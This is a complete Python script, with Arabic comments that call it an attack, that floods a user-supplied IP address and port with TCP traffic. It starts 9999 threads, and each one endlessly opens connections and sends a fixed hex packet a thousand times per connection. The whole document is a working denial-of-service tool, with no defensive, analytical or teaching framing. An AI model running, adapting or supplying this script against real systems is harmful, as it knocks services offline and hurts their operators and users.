import socket
import threading

# إعدادات الهدف
ip = input("IP: ")
port = int(input("Port: "))
num_connections = 9999

# حزمة البيانات
packet = bytes.fromhex("F10400010700000001000000F2")
num_send_per_connection = 1000

# وظيفة الهجوم
def send_packets():
    while True:  # استمرار في الإرسال بدون توقف
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((ip, port))
                for _ in range(num_send_per_connection):
                    s.sendall(packet)
                print(f"Packets sent to {ip}:{port}")
        except Exception as e:
            print(f"Error: {e}")

# تنفيذ الهجوم باستخدام خيوط متعددة
threads = []
for _ in range(num_connections):
    thread = threading.Thread(target=send_packets)
    threads.append(thread)
    thread.start()

# انتظار انتهاء جميع الخيوط (لن يحدث لأن الهجوم مستمر)
for thread in threads:
    thread.join()
